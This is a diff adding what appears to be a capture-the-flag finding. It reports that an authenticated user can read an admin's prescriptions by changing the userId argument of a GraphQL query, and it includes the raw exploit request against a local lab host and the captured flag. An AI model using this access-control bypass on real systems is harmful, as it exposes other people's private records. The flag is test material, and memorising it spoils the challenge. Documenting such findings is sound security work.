@@ -1,0 +1,9 @@
+# Any authenticated user can read admin prescriptions including the flag field by manipulating userId. Response prescription #43 contains: FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fec5949b8d}
+
+POST /graphql HTTP/1.1
+Host: 172.17.0.1:45673
+Content-Type: application/json
+Cookie: session=<any_authenticated_session_cookie>
+Content-Length: 83
+
+{"query": "{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}
